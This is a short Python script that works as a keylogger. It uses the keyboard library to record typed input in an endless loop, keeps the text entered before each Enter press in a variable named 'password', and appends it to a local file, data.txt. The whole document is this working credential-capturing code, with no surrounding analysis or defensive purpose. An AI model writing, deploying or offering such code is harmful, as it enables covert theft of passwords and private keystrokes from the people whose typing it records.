import keyboard

path = "data.txt"

while True:
    with open(path, 'a') as data_file:
        events = keyboard.record('enter')
        password = list(keyboard.get_typed_strings(events))

        data_file.write('\n')
        data_file.write(password[0])
   